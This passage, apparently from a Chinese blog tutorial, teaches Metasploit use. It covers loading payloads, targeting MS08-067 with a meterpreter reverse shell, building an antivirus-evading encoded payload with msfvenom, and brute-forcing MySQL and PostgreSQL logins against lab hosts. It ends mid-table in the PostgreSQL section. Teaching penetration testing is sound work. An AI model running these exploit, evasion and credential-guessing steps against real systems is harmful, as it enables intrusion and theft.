title="三、实施攻击"></a>三、实施攻击</h2><p>当用户找到可利用漏洞的渗透测试模块后，即可实施攻击。为执行进一步攻击，用户还可以加载攻击载荷（Payload）。然后，配置攻击载荷，并实施攻击。</p><h3 id="3-1-加载攻击载荷"><a href="#3-1-加载攻击载荷" class="headerlink" title="3.1 加载攻击载荷"></a>3.1 加载攻击载荷</h3><p>攻击载荷就是前面提到的Payload模块。通过加载攻击载荷，以实现进一步攻击，如获取Shell和远程执行命令等。下面将介绍加载攻击载荷的方法。</p><p>加载攻击载荷的语法格式如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> payload &lt;payload name&gt;</span><br></pre></td></tr></table></figure><p>以上语法中，参数payload name表示攻击载荷的名称。</p><ol><li><p>启动渗透测试模块。如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># msfconsole</span></span><br><span class="line">msf6 &gt; use exploit/<span class="built_in">test</span>/webtest</span><br><span class="line">msf6 exploit(<span class="built_in">test</span>/webtest) &gt;</span><br></pre></td></tr></table></figure></li><li><p>查看可加载的Payload。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(<span class="built_in">test</span>/webtest) &gt; show payloads</span><br><span class="line">Compatible Payloads</span><br><span class="line">===================</span><br><span class="line">   <span class="comment">#   Name         Disclosure Date    Rank    Check  Description</span></span><br><span class="line">   -   ----         ---------------    ----    -----  -----------</span><br><span class="line">   1   generic/custom                  normal  No     Custom Payload</span><br><span class="line">   2   generic/shell_bind_tcp          normal  No     Generic Command Shell, Bind TCP Inline</span><br><span class="line">   3   generic/shell_reverse_tcp       normal  No     Generic Command Shell, Reverse TCP Inline</span><br><span class="line">   4   php/bind_perl                   normal  No     PHP Command Shell, Bind TCP (via Perl)</span><br><span class="line">   5   php/bind_perl_ipv6              normal  No     PHP Command Shell, Bind TCP (via perl) IPv6 TCP (via perl) IPv6</span><br><span class="line">   6   php/bind_php                    normal  No     PHP Command Shell, Bind TCP (via PHP)</span><br><span class="line">   7   php/bind_php_ipv6               normal  No     PHP Command Shell, Bind TCP (via php) IPv6</span><br><span class="line">   8   php/download_exec               normal  No     PHP Executable Download and Execute</span><br><span class="line">   9   php/<span class="built_in">exec</span>                        normal  No     PHP Execute Command </span><br><span class="line">   10  php/meterpreter/bind_tcp        normal  No     PHP Meterpreter, Bind TCP Stager</span><br></pre></td></tr></table></figure><p>从输出的信息可以看到，显示了当前渗透测试模块所有可用的payload。输出的信息共显示了6列信息，分别表示#（Payload编号）、Name（名称）、Disclosure Date（发布日期）、Rank（级别）、Check（是否支持检测）和Description（描述信息）。例如，加载一个PHP执行命令的payload，即php/exec。</p></li><li><p>加载攻击载荷。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(<span class="built_in">test</span>/webtest) &gt; <span class="built_in">set</span> payload php/<span class="built_in">exec</span> </span><br><span class="line">payload =&gt; php/<span class="built_in">exec</span></span><br></pre></td></tr></table></figure><p>从输出的信息可以看到，加载了名为php/exec的攻击载荷。</p></li></ol><h3 id="3-2-配置攻击载荷"><a href="#3-2-配置攻击载荷" class="headerlink" title="3.2 配置攻击载荷"></a>3.2 配置攻击载荷</h3><p>当用户加载攻击载荷后，还需要进行配置，设置需要配置的参数选项。</p><p>下面将以php/exec为例，介绍配置攻击载荷的方法。如下：</p><ol><li><p>使用show options命令查看可配置的选项。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(<span class="built_in">test</span>/webtest) &gt; show options </span><br><span class="line">Module options (exploit/<span class="built_in">test</span>/webtest):                   <span class="comment">#模块选项</span></span><br><span class="line">   Name       Current Setting       Required      Description</span><br><span class="line">   ----       ---------------       --------      -----------</span><br><span class="line">   Proxies                          no            A proxy chain of format ype:host:port[,<span class="built_in">type</span>:host:port][...]</span><br><span class="line">   RHOSTS     192.168.29.141        yes          The target address range or CIDR identifier</span><br><span class="line">   RPORT      80                    yes           The target port (TCP)</span><br><span class="line">   SSL        <span class="literal">false</span>                 no            Negotiate SSL/TLS <span class="keyword">for</span> outgoing connections</span><br><span class="line">   TARGETURI  /elFinder/            yes           The base path to elFinder</span><br><span class="line">   VHOST                            no            HTTP server virtual host Payload options (php/<span class="built_in">exec</span>):  <span class="comment">#Payload选项</span></span><br><span class="line">   Name    Current Setting         Required        Description</span><br><span class="line">   ----    ---------------         --------        -----------</span><br><span class="line">   CMD                             yes               The <span class="built_in">command</span> string to execute</span><br><span class="line">Exploit target:                                                                                                <span class="comment">#可利用的目标</span></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Auto</span><br></pre></td></tr></table></figure><p>从输出的信息可以看到，已设置Payload的选项CMD值为dir。接下来，就可以对目标实施攻击了。</p></li><li><p>实施攻击。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(<span class="built_in">test</span>/webtest) &gt; exploit</span><br></pre></td></tr></table></figure></li></ol><h3 id="3-3-设置架构"><a href="#3-3-设置架构" class="headerlink" title="3.3 设置架构"></a>3.3 设置架构</h3><p>一些渗透测试模块可能支持多个系统架构。一般情况下，支持多系统架构的渗透测试模块都默认为自动的。当用户发起攻击后，渗透测试模块将自动根据探测的目标信息来选择目标。如果用户是通过其他途径获取目标主机的架构，也可以手动设置其架构，以提高渗透测试效率。</p><p>下面将以MS08_067漏洞模块为例，介绍设置架构的方法。具体操作步骤如下：</p><ol><li><p>选择MS08_067漏洞模块，并查看模块配置选项。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use exploit/windows/smb/ms08_067_netapi </span><br><span class="line">msf6 exploit(windows/smb/ms08_067_netapi) &gt; </span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/smb/ms08_067_netapi):  <span class="comment">#模块选项</span></span><br><span class="line"></span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   RHOSTS                    yes       The target host(s), range CIDR identifier, or hosts file with syntax <span class="string">'file:&lt;path&gt;'</span></span><br><span class="line">   RPORT    445              yes       The SMB service port (TCP)</span><br><span class="line">   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (windows/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  thread           yes       Exit technique (Accepted: <span class="string">''</span>, seh, thread, process, none)</span><br><span class="line">   LHOST     192.168.10.12    yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:                                       <span class="comment">#可利用的目标</span></span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic Targeting</span><br></pre></td></tr></table></figure><p>从输出的信息可以看到MS08_067漏洞模块的所有配置选项。从显示的结果中可以看到，可利用的目标为Automatic Targeting。此时，用户可以使用show targets命令查看该漏洞模块支持的目标架构。</p></li><li><p>查看可利用的目标架构。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows/smb/ms08_067_netapi) &gt; show targets</span><br><span class="line"></span><br><span class="line">Exploit targets:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic Targeting</span><br><span class="line">   1   Windows 2000 Universal</span><br><span class="line">   2   Windows XP SP0/SP1 Universal</span><br><span class="line">   3   Windows 2003 SP0 Universal</span><br><span class="line">   4   Windows XP SP2 English (AlwaysOn NX)</span><br><span class="line">   5   Windows XP SP2 English (NX)</span><br><span class="line">   6   Windows XP SP3 English (AlwaysOn NX)</span><br><span class="line">   7   Windows XP SP3 English (NX)</span><br><span class="line">   8   Windows XP SP2 Arabic (NX)</span><br><span class="line">   9   Windows XP SP2 Chinese - Traditional / Taiwan (NX)</span><br><span class="line">   10  Windows XP SP2 Chinese - Simplified (NX)</span><br><span class="line">   11  Windows XP SP2 Chinese - Traditional (NX)</span><br><span class="line">   12  Windows XP SP2 Czech (NX)</span><br><span class="line">   13  Windows XP SP2 Danish (NX)</span><br><span class="line">   14  Windows XP SP2 German (NX)</span><br><span class="line">   15  Windows XP SP2 Greek (NX)</span><br><span class="line">   16  Windows XP SP2 Spanish (NX)</span><br><span class="line">   17  Windows XP SP2 Finnish (NX)</span><br><span class="line">   18  Windows XP SP2 French (NX)</span><br><span class="line">   19  Windows XP SP2 Hebrew (NX)</span><br><span class="line">   20  Windows XP SP2 Hungarian (NX)</span><br><span class="line">   21  Windows XP SP2 Italian (NX)</span><br><span class="line">   22  Windows XP SP2 Japanese (NX)</span><br><span class="line">   23  Windows XP SP2 Korean (NX)</span><br><span class="line">   24  Windows XP SP2 Dutch (NX)</span><br><span class="line">   25  Windows XP SP2 Norwegian (NX)</span><br><span class="line">   26  Windows XP SP2 Polish (NX)</span><br><span class="line">   27  Windows XP SP2 Portuguese - Brazilian (NX)</span><br><span class="line">   28  Windows XP SP2 Portuguese (NX)</span><br><span class="line">   29  Windows XP SP2 Russian (NX)</span><br><span class="line">   30  Windows XP SP2 Swedish (NX)</span><br><span class="line">   31  Windows XP SP2 Turkish (NX)</span><br><span class="line">   32  Windows XP SP3 Arabic (NX)</span><br><span class="line">   33  Windows XP SP3 Chinese - Traditional / Taiwan (NX)</span><br><span class="line">   34  Windows XP SP3 Chinese - Simplified (NX)</span><br><span class="line">   35  Windows XP SP3 Chinese - Traditional (NX)</span><br><span class="line">   36  Windows XP SP3 Czech (NX)</span><br><span class="line">   37  Windows XP SP3 Danish (NX)</span><br><span class="line">   38  Windows XP SP3 German (NX)</span><br><span class="line">   39  Windows XP SP3 Greek (NX)</span><br><span class="line">   40  Windows XP SP3 Spanish (NX)</span><br><span class="line">  …//省略部分内容//…</span><br><span class="line">   69  Windows 2003 SP2 Spanish (NX)</span><br><span class="line">   70  Windows 2003 SP2 Japanese (NO NX)</span><br><span class="line">   71  Windows 2003 SP2 French (NO NX)</span><br><span class="line">   72  Windows 2003 SP2 French (NX)</span><br></pre></td></tr></table></figure><p>从输出的信息可以看到该模块支持的所有目标架构。在输出的信息中共包括两列，分别表示Id（编号）和Name（目标名称）。通过分析输出的结果可知，该漏洞模块支持的架构有Windows 2000 Universal、Windows XP SP0/SP1 Universal和Windows 2003 SP0 Universal等。接下来，用户就可以根据自己的目标系统架构来设置。其中，设置架构的语法格式如下：</p><blockquote><p>set target [id]</p></blockquote></li><li><p>设置目标架构为Windows XP SP0/SP1 Universal。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows/smb/ms08_067_netapi) &gt; <span class="built_in">set</span> target 2</span><br><span class="line">target =&gt; 2</span><br></pre></td></tr></table></figure><p>从输出的信息可以看到，已成功设置目标架构编号为2。此时，用户可以再次查看模块的选项，已确定目标架构设置成功。如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows/smb/ms08_067_netapi) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/smb/ms08_067_netapi):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   RHOSTS                    yes       The target host(s), range CIDR identifier, or hosts file with syntax <span class="string">'file:&lt;path&gt;'</span></span><br><span class="line">   RPORT    445              yes       The SMB service port (TCP)</span><br><span class="line">   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (windows/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  thread           yes       Exit technique (Accepted: <span class="string">''</span>, seh, thread, process, none)</span><br><span class="line">   LHOST     192.168.10.12    yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   2   Windows XP SP0/SP1 Universal</span><br></pre></td></tr></table></figure><p>从输出的信息可以看到，成功设置目标系统架构为Windows XP SP0/SP1 Universal。</p></li></ol><h3 id="3-4-设置编码"><a href="#3-4-设置编码" class="headerlink" title="3.4 设置编码"></a>3.4 设置编码</h3><p>为了避免出现坏字符，或者规避目标主机中防火墙或杀毒软件的拦截，可以为攻击载荷设置编码，从而生成新的攻击载荷。其中，编码模块主要供msfvenom工具使用。msfvenom是MSF框架配套的攻击载荷生成器。其中，用于生成攻击载荷的语法格式如下：</p><blockquote><p>msfvenom [options] &lt;var=val&gt;</p></blockquote><p>该命令常用的选项及含义如下：</p><blockquote><p>-p：指定使用的Payload。<br>-e：指定编码格式。<br>-a：指定系统架构，默认是x86。<br>-s：指定Payload的最大值。<br>-i：指定编码次数。<br>-f：指定生成的文件格式。</p></blockquote><p>使用x86/shikata_ga_nai编码格式生成一个新的攻击载荷，并保存到msf.exe中。方法如下：</p><ol><li><p>查看支持的所有编码。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># msfvenom -l encoders                           </span></span><br><span class="line"></span><br><span class="line">Framework Encoders [--encoder &lt;value&gt;]</span><br><span class="line">======================================</span><br><span class="line"></span><br><span class="line">    Name                          Rank       Description</span><br><span class="line">    ----                          ----       -----------</span><br><span class="line">    cmd/brace                     low        Bash Brace Expansion Command Encoder</span><br><span class="line">    cmd/<span class="built_in">echo</span>                      good       Echo Command Encoder</span><br><span class="line">    cmd/generic_sh                manual     Generic Shell Variable Substitution Command Encoder</span><br><span class="line">    cmd/ifs                       low        Bourne <span class="variable">$&#123;IFS&#125;</span> Substitution Command Encoder</span><br><span class="line"></span><br><span class="line">…//省略部分内容//…</span><br></pre></td></tr></table></figure></li><li><p>创建攻击载荷。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">─<span class="comment"># msfvenom -p windows/meterpreter/bind_tcp RHOST=192.168.10.12 --platform windows -a x86 -e x86/shikata_ga_nai -f exe &gt; msf.exe</span></span><br><span class="line">Found 1 compatible encoders</span><br><span class="line">Attempting to encode payload with 1 iterations of x86/shikata_ga_nai</span><br><span class="line">x86/shikata_ga_nai succeeded with size 353 (iteration=0)</span><br><span class="line">x86/shikata_ga_nai chosen with final size 353</span><br><span class="line">Payload size: 353 bytes</span><br><span class="line">Final size of exe file: 73802 bytes</span><br></pre></td></tr></table></figure><p>从以上输出的信息中可以看到，成功使用x86/shikata_ga_nai编码创建了一个攻击载荷。其中，该攻击载荷文件为msf.exe。</p></li></ol><h2 id="四、攻击范例"><a href="#四、攻击范例" class="headerlink" title="四、攻击范例"></a>四、攻击范例</h2><p>不同的攻击模块使用的步骤不同，需要用户灵活使用。但是，基本思路都一样。用户都是先查找可以利用其漏洞的渗透测试模块，然后加载攻击载荷，进而实施渗透测试。</p><h3 id="4-1-渗透攻击MySQL数据库服务"><a href="#4-1-渗透攻击MySQL数据库服务" class="headerlink" title="4.1 渗透攻击MySQL数据库服务"></a>4.1 渗透攻击MySQL数据库服务</h3><p>MySQL是一个关系型数据库管理系统。在Web服务器应用方面，MySQL数据库通常是用户的最优选择。如果管理员配置不当，就可能存在漏洞，如弱密码、用户权限配置错误等。此时，渗透测试者可以尝试对其实施渗透测试。在MSF控制终端，提供了一个辅助模块mysql_login，可以用来实施弱密码破解。</p><p>使用mysql_login模块，渗透攻击MySQL数据库服务。具体操作步骤如下：</p><ol><li><p>使用mysql_login模块。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use auxiliary/scanner/mysql/mysql_login </span><br><span class="line">msf6 auxiliary(scanner/mysql/mysql_login) &gt;</span><br></pre></td></tr></table></figure></li><li><p>查看模块配置选项。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">msf6 auxiliary(scanner/mysql/mysql_login) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (auxiliary/scanner/mysql/mysql_login):</span><br><span class="line"></span><br><span class="line">   Name              Current Setting  Required  Description</span><br><span class="line">   ----              ---------------  --------  -----------</span><br><span class="line">   BLANK_PASSWORDS   <span class="literal">true</span>             no        Try blank passwords <span class="keyword">for</span> all users</span><br><span class="line">   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5</span><br><span class="line">   DB_ALL_CREDS      <span class="literal">false</span>            no        Try each user/password couple stored <span class="keyword">in</span> the current database</span><br><span class="line">   DB_ALL_PASS       <span class="literal">false</span>            no        Add all passwords <span class="keyword">in</span> the current database to the list</span><br><span class="line">   DB_ALL_USERS      <span class="literal">false</span>            no        Add all users <span class="keyword">in</span> the current database to the list</span><br><span class="line">   PASSWORD                           no        A specific password to authenticate with</span><br><span class="line">   PASS_FILE                          no        File containing passwords, one per line</span><br><span class="line">   Proxies                            no        A proxy chain of format <span class="built_in">type</span>:host:port[,<span class="built_in">type</span>:host:port][...]</span><br><span class="line">   RHOSTS                             yes       The target host(s), range CIDR identifier, or hosts file with syntax <span class="string">'file:&lt;path&gt;'</span></span><br><span class="line">   RPORT             3306             yes       The target port (TCP)</span><br><span class="line">   STOP_ON_SUCCESS   <span class="literal">false</span>            yes       Stop guessing when a credential works <span class="keyword">for</span> a host</span><br><span class="line">   THREADS           1                yes       The number of concurrent threads (max one per host)</span><br><span class="line">   USERNAME          root             no        A specific username to authenticate as</span><br><span class="line">   USERPASS_FILE                      no        File containing users and passwords separated by space, one pair per line</span><br><span class="line">   USER_AS_PASS      <span class="literal">false</span>            no        Try the username as the password <span class="keyword">for</span> all users</span><br><span class="line">   USER_FILE                          no        File containing usernames, one per line</span><br><span class="line">   VERBOSE           <span class="literal">true</span>             yes       Whether to <span class="built_in">print</span> output <span class="keyword">for</span> all attempts</span><br></pre></td></tr></table></figure><p>从输出的信息可以看到所有的配置选项参数。其中，有几个必须配置的选项。接下来，将对其进行配置。</p></li><li><p>配置模块选项参数。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msf6 auxiliary(scanner/mysql/mysql_login) &gt; <span class="built_in">set</span> RHOSTS 192.168.10.56</span><br><span class="line">RHOSTS =&gt; 192.168.10.56</span><br><span class="line">msf6 auxiliary(scanner/mysql/mysql_login) &gt; <span class="built_in">set</span> USER_FILE /root/users.txt</span><br><span class="line">USER_FILE =&gt; /root/users.txt</span><br><span class="line">msf6 auxiliary(scanner/mysql/mysql_login) &gt; <span class="built_in">set</span> USERPASS_FILE /root/passwords.txt</span><br><span class="line">USERPASS_FILE =&gt; /root/passwords.txt</span><br></pre></td></tr></table></figure><p>从输出的信息可以看到，成功设置了模块选项参数。</p></li><li><p>实施渗透测试。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">msf5 auxiliary(scanner/mysql/mysql_login) &gt; exploit</span><br><span class="line">[+] 192.168.10.56:3306  - 192.168.10.56:3306 - Found remote MySQL version </span><br><span class="line">5.0.51a</span><br><span class="line">[-] 192.168.10.56:3306  - 192.168.10.56:3306 - LOGIN FAILED: aaaa:aaaa </span><br><span class="line">(Incorrect: Access denied <span class="keyword">for</span> user <span class="string">'aaaa'</span>@<span class="string">'192.168.10.75'</span> (using password: </span><br><span class="line">YES))</span><br><span class="line">[-] 192.168.10.56:3306  - 192.168.10.56:3306 - LOGIN FAILED: aaaa:bob </span><br><span class="line">(Incorrect: Access denied <span class="keyword">for</span> user <span class="string">'aaaa'</span>@<span class="string">'192.168.10.75'</span> (using password: </span><br><span class="line">YES))</span><br><span class="line">[-] 192.168.10.56:3306  - 192.168.10.56:3306 - LOGIN FAILED: aaaa:root </span><br><span class="line">(Incorrect: Access denied <span class="keyword">for</span> user <span class="string">'aaaa'</span>@<span class="string">'192.168.10.75'</span> (using password: </span><br><span class="line">YES))</span><br><span class="line">[-] 192.168.10.56:3306  - 192.168.10.56:3306 - LOGIN FAILED: aaaa:toor </span><br><span class="line">(Incorrect: Access denied <span class="keyword">for</span> user <span class="string">'aaaa'</span>@<span class="string">'192.168.10.75'</span> (using password: </span><br><span class="line">YES))</span><br><span class="line"> [+] 192.168.10.56:3306  - 192.168.10.56:3306 - Success: <span class="string">'root:123456'</span></span><br><span class="line">[-] 192.168.10.56:3306  - 192.168.10.56:3306 - LOGIN FAILED: admin:</span><br><span class="line">123456 (Incorrect: Access denied <span class="keyword">for</span> user <span class="string">'admin'</span>@<span class="string">'192.168.10.75'</span> (using </span><br><span class="line">password: YES))</span><br><span class="line">[-] 192.168.10.56:3306  - 192.168.10.56:3306 - LOGIN FAILED: admin:</span><br><span class="line">www.123! (Incorrect: Access denied <span class="keyword">for</span> user <span class="string">'admin'</span>@<span class="string">'192.168.10.75'</span> </span><br><span class="line">(using password: YES))</span><br><span class="line">[-] 192.168.10.56:3306  - 192.168.10.56:3306 - LOGIN FAILED: admin:</span><br><span class="line">www.123 (Incorrect: Access denied <span class="keyword">for</span> user <span class="string">'admin'</span>@<span class="string">'192.168.10.75'</span> (using </span><br><span class="line">password: YES))</span><br><span class="line">[-] 192.168.10.56:3306  - 192.168.10.56:3306 - LOGIN FAILED: admin:</span><br><span class="line">admin (Incorrect: Access denied <span class="keyword">for</span> user <span class="string">'admin'</span>@<span class="string">'192.168.10.75'</span> (using </span><br><span class="line">password: YES))</span><br><span class="line">[*] Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure><p>从输出的信息可以看到，依次尝试使用指定的用户名/密码文件中的用户名和密码连接了MySQL服务器。通过尝试所有的用户名和密码，找到了一个有效的MySQL数据库用户和密码，其用户名为root，密码为123456。</p></li></ol><h3 id="4-2-渗透攻击PostgreSQL数据库服务"><a href="#4-2-渗透攻击PostgreSQL数据库服务" class="headerlink" title="4.2 渗透攻击PostgreSQL数据库服务"></a>4.2 渗透攻击PostgreSQL数据库服务</h3><p>PostgerSQL是一个自由的对象——关系数据库服务（数据库管理系统）。在某些情况下，用户也可以使用该数据库服务来存储数据，如Metasploit。</p><p>使用postgres_login模块，实施渗透攻击PostgreSQL数据库服务。具体操作步骤如下：</p><ol><li><p>选择postgres_login模块。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use auxiliary/scanner/postgres/postgres_login </span><br><span class="line">msf6 auxiliary(scanner/postgres/postgres_login) &gt;</span><br></pre></td></tr></table></figure></li><li><p>查看可配置的选项参数。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">msf6 auxiliary(scanner/postgres/postgres_login) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (auxiliary/scanner/postgres/postgres_login):</span><br><span class="line"></span><br><span class="line">   Name              Current Setting                                                               Required  Description</span><br><span class="line">   ----              ---------------                                                               --------  -----------</span><br><span class="line">   BLANK_PASSWORDS   <span class="literal">false</span>                                                                         no        Try blank passwords <span class="keyword">for</span> all users</span><br><span class="line">   BRUTEFORCE_SPEED  5                                                                             yes       How fast to bruteforce, from 0 to 5</span><br><span class="line">   DATABASE          template1                                                                     yes       The database to authenticate against</span><br><span class="line">   DB_ALL_CREDS      <span class="literal">false</span>                                                                         no        Try each user/password couple stored <span class="keyword">in</span> the current database</span><br><span class="line">   DB_ALL_PASS       <span class="literal">false</span>           